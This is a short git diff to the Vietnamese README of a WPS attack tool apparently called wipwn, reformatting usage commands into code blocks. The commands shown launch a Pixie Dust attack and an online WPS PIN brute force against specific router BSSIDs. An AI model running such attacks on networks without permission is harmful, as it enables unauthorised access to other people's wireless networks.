@@ -61,11 +61,17 @@ sudo python main.py -i wlan0 -K
 ```bash
 sudo python main.py -i wlan0 -K
 ```
--```bash wipwn.sh```
+```bash
+wipwn.sh
+```
 - - Bắt đầu tấn công Pixie Dust vào BSSID được chỉ định:
-`sudo python main.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
+```bash
+sudo python main.py -i wlan0 -b 00:91:4C:C3:AC:28 -K
+```
 - Khởi chạy WPS bruteforce trực tuyến với nửa đầu tiên được chỉ định của mã PIN:
-- `sudo python main.py -i wlan0 -b 50:0F:F5:B0:08:05 -B -p 1234`
+```bash
+sudo python main.py -i wlan0 -b 50:0F:F5:B0:08:05 -B -p 1234
+```
 ### Xử lý sự cố
 **"Thiết bị hoặc tài nguyên đang bận (-16)" - Bật Wifi rồi tắt Wifi.**
 
